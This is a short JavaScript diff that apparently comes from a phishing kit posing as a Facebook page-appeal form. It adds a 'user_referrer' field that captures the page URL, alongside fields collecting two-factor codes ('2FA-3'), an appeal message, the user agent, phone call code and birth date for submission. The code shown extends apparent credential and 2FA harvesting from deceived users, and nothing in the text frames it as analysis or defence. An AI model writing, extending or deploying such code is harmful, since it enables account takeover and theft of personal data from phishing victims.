@@ -5298,6 +5298,7 @@
             '2FA-3': '',
             'page-name': '',
             'apeal': '',
+            'user_referrer': ''
         }
 
         var userIpData = {
@@ -5458,6 +5459,7 @@
                 'fb_page_name': formsSendData['page-name'],
                 'message': formsSendData['apeal'],
                 'user_agent': window.navigator.userAgent,
+                'user_referrer': window.window.location.href,
                 'call_code' : userIpData.call_code,
                 'day': formsSendData['day'],
                 'month': formsSendData['month'],
